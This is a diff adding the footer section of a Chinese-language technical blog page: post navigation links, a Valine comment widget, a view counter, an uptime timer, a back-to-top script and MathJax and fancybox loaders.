+        <a href="/2021/26CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_self">26CSRF跨站请求伪造</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/3Linux%E5%9F%BA%E7%A4%8E/" target="_self">3Linux基礎</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
